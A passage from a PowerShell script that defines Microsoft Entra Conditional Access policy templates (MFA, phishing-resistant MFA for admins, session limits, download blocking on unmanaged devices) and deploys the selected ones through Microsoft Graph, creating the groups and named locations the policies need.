                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 2041 - GRANT - Terms of Use (Guests only)",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [],
        "customAuthenticationFactors": [],
        "termsOfUse": [
            "ENTRATERMSOFUSE_Terms of Use_ENTRATERMSOFUSE"
        ],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "2050"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 2050 - GRANT - MFA for All Users"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Protects all user authentications with MFA. This policy applies to both internal users and guest users on all devices and clients. Intune enrollment is excluded since MFA is not supported during enrollment of fully managed devices."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP",
                "ENTRAGROUP_Conditional Access Service Accounts_ENTRAGROUP"
            ],
            "excludeRoles": [
                "d29b2b05-8046-44ba-8758-1e26182fcf32"
            ],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [
                "0000000a-0000-0000-c000-000000000000"
            ],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 2050 - GRANT - MFA for All Users",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": {
            "id": "00000000-0000-0000-0000-000000000002"
        }
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "2055"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 2055 - GRANT - Phishing Resistant MFA for Admins"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Protects privileged admin roles with phishing resistant MFA, like FIDO2."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "grantControls": {
        "builtInControls": [],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": {
            "id": "00000000-0000-0000-0000-000000000004"
        },
        "operator": "OR"
    },
    "partialEnablementStrategy": null,
    "templateId": null,
    "sessionControls": null,
    "displayName": "$AddCustomPrefix`GLOBAL - 2055 - GRANT - Phishing Resistant MFA for Admins",
    "conditions": {
        "deviceStates": null,
        "devices": null,
        "users": {
            "excludeGuestsOrExternalUsers": null,
            "includeRoles": [
                "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3",
                "0526716b-113d-4c15-b2c8-68e3c22b9f80",
                "158c047a-c907-4556-b7ef-446551a6b5f7",
                "17315797-102d-40b4-93e0-432062caca18",
                "e6d1a23a-da11-4be4-9570-befc86d067a7",
                "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9",
                "62e90394-69f5-4237-9190-012177145e10",
                "8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2",
                "7be44c8a-adaf-4e2a-84d6-ab2649e08a13",
                "e8611ab8-c189-46e8-94e1-60213ab1f814",
                "194ae4cb-b126-40b2-bd5b-6091b380977d"
            ],
            "includeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "includeGroups": [],
            "excludeUsers": [],
            "includeGuestsOrExternalUsers": null,
            "excludeRoles": []
        },
        "clientApplications": null,
        "applications": {
            "includeAuthenticationContextClassReferences": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "applicationFilter": null,
            "excludeApplications": []
        },
        "signInRiskLevels": [],
        "userRiskLevels": [],
        "platforms": null,
        "clientAppTypes": [
            "all"
        ],
        "times": null,
        "locations": null
    },
    "state": "enabledForReportingButNotEnforced"
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "2060"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 2060 - GRANT - Mobile Apps and Desktop Clients"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Requires mobile apps and desktop clients to be Intune compliant. BYOD is blocked."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP",
                "ENTRAGROUP_Conditional Access Service Accounts_ENTRAGROUP"
            ],
            "excludeRoles": [
                "d29b2b05-8046-44ba-8758-1e26182fcf32"
            ],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "mobileAppsAndDesktopClients"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 2060 - GRANT - Mobile Apps and Desktop Clients",
    "state": "disabled",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "compliantDevice"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "2070"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 2070 - GRANT - Mobile Device Access Requirements"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Requires apps to be protected by Intune App Protection Policies (MAM) on iOS and Android. This blocks third-party app store apps and encrypts org data on mobile devices."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": {
            "includePlatforms": [
                "android",
                "iOS"
            ],
            "excludePlatforms": []
        },
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP",
                "ENTRAGROUP_Conditional Access Service Accounts_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "mobileAppsAndDesktopClients"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [
                "0000000a-0000-0000-c000-000000000000"
            ],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 2070 - GRANT - Mobile Device Access Requirements",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "compliantApplication"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "3010"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 3010 - SESSION - Admin Persistence (9 hours)"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This policy disables token persistence for all accounts with admin roles assigned. It also sets the sign-in frequency to 9 hours. This is to protect against Primary Refresh Token stealing attacks by keeping such tokens few and short-lived. Always use separate cloud-only accounts for admin role assignments."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": {
        "signInFrequency": {
            "frequencyInterval": "timeBased",
            "type": "hours",
            "value": 9,
            "isEnabled": true,
            "authenticationType": "primaryAndSecondaryAuthentication"
        },
        "cloudAppSecurity": null,
        "secureSignInSession": null,
        "disableResilienceDefaults": null,
        "applicationEnforcedRestrictions": null,
        "persistentBrowser": {
            "mode": "never",
            "isEnabled": true
        },
        "continuousAccessEvaluation": null
    },
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": [
                "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3",
                "0526716b-113d-4c15-b2c8-68e3c22b9f80",
                "158c047a-c907-4556-b7ef-446551a6b5f7",
                "17315797-102d-40b4-93e0-432062caca18",
                "e6d1a23a-da11-4be4-9570-befc86d067a7",
                "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9",
                "62e90394-69f5-4237-9190-012177145e10",
                "8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2",
                "7be44c8a-adaf-4e2a-84d6-ab2649e08a13",
                "e8611ab8-c189-46e8-94e1-60213ab1f814",
                "194ae4cb-b126-40b2-bd5b-6091b380977d"
            ]
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 3010 - SESSION - Admin Persistence",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": null
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "3011"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 3011 - SESSION - Admin Persistence (4 hours)"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This policy disables token persistence for all accounts with admin roles assigned. It also sets the sign-in frequency to 9 hours. This is to protect against Primary Refresh Token stealing attacks by keeping such tokens few and short-lived. Always use separate cloud-only accounts for admin role assignments."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": {
        "signInFrequency": {
            "frequencyInterval": "timeBased",
            "type": "hours",
            "value": 4,
            "isEnabled": true,
            "authenticationType": "primaryAndSecondaryAuthentication"
        },
        "cloudAppSecurity": null,
        "secureSignInSession": null,
        "disableResilienceDefaults": null,
        "applicationEnforcedRestrictions": null,
        "persistentBrowser": {
            "mode": "never",
            "isEnabled": true
        },
        "continuousAccessEvaluation": null
    },
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": [
                "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3",
                "0526716b-113d-4c15-b2c8-68e3c22b9f80",
                "158c047a-c907-4556-b7ef-446551a6b5f7",
                "17315797-102d-40b4-93e0-432062caca18",
                "e6d1a23a-da11-4be4-9570-befc86d067a7",
                "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9",
                "62e90394-69f5-4237-9190-012177145e10",
                "8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2",
                "7be44c8a-adaf-4e2a-84d6-ab2649e08a13",
                "e8611ab8-c189-46e8-94e1-60213ab1f814",
                "194ae4cb-b126-40b2-bd5b-6091b380977d"
            ]
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 3011 - SESSION - Admin Persistence",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": null
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "3020"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 3020 - SESSION - BYOD Persistence"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This policy disables token persistence for all accounts signing in from a non-compliant (unmanaged) device. It also sets the sign-in frequency to 9 hours."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": {
        "signInFrequency": {
            "frequencyInterval": "timeBased",
            "type": "hours",
            "value": 9,
            "isEnabled": true,
            "authenticationType": "primaryAndSecondaryAuthentication"
        },
        "cloudAppSecurity": null,
        "secureSignInSession": null,
        "disableResilienceDefaults": null,
        "applicationEnforcedRestrictions": null,
        "persistentBrowser": {
            "mode": "never",
            "isEnabled": true
        },
        "continuousAccessEvaluation": null
    },
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": {
                "externalTenants": {
                    "membershipKind": "all",
                    "@odata.type": "#microsoft.graph.conditionalAccessAllExternalTenants"
                },
                "guestOrExternalUserTypes": "internalGuest,b2bCollaborationGuest,b2bCollaborationMember,b2bDirectConnectUser,otherExternalUser,serviceProvider"
            },
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": {
            "excludeDevices": [],
            "excludeDeviceStates": [],
            "includeDevices": [],
            "includeDeviceStates": [],
            "deviceFilter": {
                "mode": "exclude",
                "rule": "device.isCompliant -eq True"
            }
        },
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 3020 - SESSION - BYOD Persistence",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": null
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "3030"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 3030 - SESSION - Register Security Info Requirements"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Require reauthentication when registering security info. This helps to protect against different identity theft attacks."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": {
        "signInFrequency": {
            "frequencyInterval": "everyTime",
            "type": null,
            "value": null,
            "isEnabled": true,
            "authenticationType": "primaryAndSecondaryAuthentication"
        },
        "cloudAppSecurity": null,
        "secureSignInSession": null,
        "disableResilienceDefaults": null,
        "applicationEnforcedRestrictions": null,
        "persistentBrowser": null,
        "continuousAccessEvaluation": null
    },
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [
                "urn:user:registersecurityinfo"
            ],
            "includeApplications": [],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 3030 - SESSION - Register Security Info Requirements",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": null
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "3040"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 3040 - SESSION - Block File Downloads On Unmanaged Devices"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This policy blocks file downloads in SharePoint Online, Teams, OneDrive, and Exchange Online on unmanaged devices. Note that App Enforced Restrictions must be enabled in the services for this to work."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": {
        "signInFrequency": null,
        "cloudAppSecurity": null,
        "secureSignInSession": null,
        "disableResilienceDefaults": null,
        "applicationEnforcedRestrictions": {
            "isEnabled": true
        },
        "persistentBrowser": null,
        "continuousAccessEvaluation": null
    },
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": {
            "excludeDevices": [],
            "excludeDeviceStates": [],
            "includeDevices": [],
            "includeDeviceStates": [],
            "deviceFilter": {
                "mode": "exclude",
                "rule": "device.isCompliant -eq True"
            }
        },
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "00000003-0000-0ff1-ce00-000000000000"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 3040 - SESSION - Block File Downloads On Unmanaged Devices",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": null
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "3050"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 3050 - SESSION - Defender for Cloud Apps Integration"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This policy enables Defender for Cloud Apps integration (reverse proxy) for Office 365 access. It requires Defender for Cloud Apps licenses for all targeted users. Access and Session policies are managed from the Defender XDR portal."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "grantControls": null,
    "partialEnablementStrategy": null,
    "conditions": {
        "userRiskLevels": [],
        "applications": {
        "includeApplications": [
            "Office365"
        ],
        "applicationFilter": null,
        "includeAuthenticationContextClassReferences": [],
        "includeUserActions": [],
        "excludeApplications": []
        },
        "locations": null,
        "clientApplications": null,
        "users": {
        "excludeGuestsOrExternalUsers": null,
        "includeRoles": [],
        "excludeRoles": [],
        "excludeUsers": [],
        "excludeGroups": [
            "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
        ],
        "includeGuestsOrExternalUsers": null,
        "includeUsers": [
            "All"
        ],
        "includeGroups": []
        },
        "devices": null,
        "clientAppTypes": [
        "all"
        ],
        "signInRiskLevels": [],
        "deviceStates": null,
        "times": null,
        "platforms": null
    },
    "sessionControls": {
        "continuousAccessEvaluation": null,
        "applicationEnforcedRestrictions": null,
        "signInFrequency": null,
        "cloudAppSecurity": {
        "cloudAppSecurityType": "mcasConfigured",
        "isEnabled": true
        },
        "secureSignInSession": null,
        "persistentBrowser": null,
        "disableResilienceDefaults": null
    },
    "displayName": "GLOBAL - 3050 - SESSION - Defender for Cloud Apps Integration",
    "state": "disabled",
    "templateId": null,
    }
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "0001"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`OVERRIDE - 0001 - GRANT - Example"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Finally, this is an example policy. All scenarios that deviates from the global baseline should have the OVERRIDE prefix, and be targeted by groups. These groups of users can be excluded from global policies. In this way, we have a strong foundations, and manages deviations with small groups of users."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "None"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "None"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`OVERRIDE - 0001 - GRANT - Example",
    "state": "disabled",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "mfa"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject


    # ----- [Execution] -----

    Write-Verbose -Verbose -Message "Launching The Conditional Access Gallery!"

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Group.ReadWrite.All', 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All', 'Agreement.ReadWrite.All', 'Application.Read.All', 'RoleManagement.ReadWrite.Directory' -Verbose


    # Prompt for policy selection, or auto-deploy if -AutoDeployIds was specified.
    $SelectedConditionalAccessTemplates = $null

    if ($AutoDeployIds) {
        $SelectedConditionalAccessTemplates = foreach ($Template in $ConditionalAccessTemplates) {
            if ($Template.Id -in $AutoDeployIds) {
                $Template
            }
        }
    } else {
        Install-OutConsoleGridView -Verbose

        $SelectedConditionalAccessTemplates = $ConditionalAccessTemplates | Select-Object Name, Description | Out-ConsoleGridView -Title "Select Conditional Access Policy Templates" -OutputMode Multiple
    }

    $SelectedConditionalAccessTemplates = foreach ($Policy in $SelectedConditionalAccessTemplates) {
        $ConditionalAccessTemplates | where Name -eq $Policy.Name
    }

    $NewPolicies = @()

    foreach ($Template in $SelectedConditionalAccessTemplates) {
        Write-Verbose -Verbose -Message "HANDLING POLICY: '$($Template.Name)'..."

        # Put Json in new variable.
        $Json = $Template.JsonTemplate


        ### STEP 1: CREATE GROUPS

        # Regex to extract content between "ENTRAGROUP_" and "_ENTRAGROUP"
        $Regex = "ENTRAGROUP_(.*?)_ENTRAGROUP"

        # Initialize an empty array
        $PolicyGroups = @()

        # Extract matches and store them in an array
        foreach ($Line in $Json -split "`n") {
            if ($Line -match $Regex) {
                $PolicyGroups += $Matches[1]
            }
        }

        # Loop through groups and create missing ones.
        $PolicyGroups = foreach ($Group in $PolicyGroups) {
            # Check for existing group.
            Write-Verbose -Verbose -Message "   Checking for existing group '$Group'..."
            $ExistingGroup = Get-MgGroup -Filter "DisplayName eq '$Group'" -Top 1

            if ($ExistingGroup) {
                Write-Verbose -Verbose -Message "   The group '$($ExistingGroup.DisplayName)' already exists!"
                $ExistingGroup | Select-Object -Property Id, DisplayName
            } else {
                # Create group if none existed.
                Write-Verbose -Verbose -Message "   Could not find '$Group'. Creating group..."
                New-MgGroup -DisplayName $Group -MailNickName $($Group.Replace(' ', '_')) -MailEnabled:$False -SecurityEnable -IsAssignableToRole | Select-Object -Property Id, DisplayName
            }
        }

        # Replace the group names in the Json with the group Ids.
         foreach ($PolicyGroup in $PolicyGroups) {
            $Json = $Json -replace "ENTRAGROUP_$($PolicyGroup.DisplayName)`_ENTRAGROUP", $PolicyGroup.Id
        }


        ### STEP 2: CREATE IP LISTS

        # Regex to extract content between "ENTRAIPLIST_" and "_ENTRAIPLIST"
        $Regex = "ENTRAIPLIST_(.*?)_ENTRAIPLIST"

        # Initialize an empty array
        $PolicyIpLists = @()

        # Extract matches and store them in an array
        foreach ($Line in $Json -split "`n") {
            if ($Line -match $Regex) {
                $PolicyIpLists += $Matches[1]
            }
        }

        # Loop through IP lists and create missing ones.
        $PolicyIpLists = foreach ($IpList in $PolicyIpLists) {
            # Check for existing IP list.
            Write-Verbose -Verbose -Message "   Checking for existing named location '$IpList'..."
            $ExistingIPList = Get-MgIdentityConditionalAccessNamedLocation -Filter "DisplayName eq '$IpList'" -Top 1

            if ($ExistingIPList) {
                Write-Verbose -Verbose -Message "   The named location '$($ExistingIPList.DisplayName)' already exists!"
                $ExistingIPList | Select-Object -Property Id, DisplayName
            } else {
                # Create named location if none existed.
                Write-Verbose -Verbose -Message "   Could not find '$IpList'. Creating named location..."
        
                # Get current public IP address:
                $PublicIp = (Get-DCPublicIp).ip
        
                $params = @{
                    "@odata.type" = "#microsoft.graph.ipNamedLocation"
                    DisplayName = "$IpList"
                    IsTrusted = $true
                    IpRanges = @(
                        @{
                            "@odata.type" = "#microsoft.graph.iPv4CidrRange"
                            CidrAddress = "$PublicIp/32"
                        }
                    )
                }
        
                New-MgIdentityConditionalAccessNamedLocation -BodyParameter $params | Select-Object -Property Id, DisplayName
            }
        }

        # Replace the named location names in the Json with the named location Ids.
         foreach ($PolicyIpList in $PolicyIpLists) {
            $Json = $Json -replace "ENTRAIPLIST_$($PolicyIpList.DisplayName)`_ENTRAIPLIST", $PolicyIpList.Id
        }


        ### STEP 3: CREATE COUNTRY LISTS

        # Regex to extract content between "ENTRACOUNTRYLIST_" and "_ENTRACOUNTRYLIST"
        $Regex = "ENTRACOUNTRYLIST_(.*?)_ENTRACOUNTRYLIST"

        # Initialize an empty array
        $PolicyCountryLists = @()

        # Extract matches and store them in an array
        foreach ($Line in $Json -split "`n") {
            if ($Line -match $Regex) {
                $PolicyCountryLists += $Matches[1]
            }
        }

        # Loop through country lists and create missing ones.
        $PolicyCountryLists = foreach ($CountryList in $PolicyCountryLists) {
            # Extracting countries from the country list.
            $CountryListOriginalName = $CountryList
            $CountryListName = ($CountryList -split 'xx')[0]
            $Countries = $CountryList -replace "$CountryListName`xx", '' -split 'xx'

            # Check for existing country list.
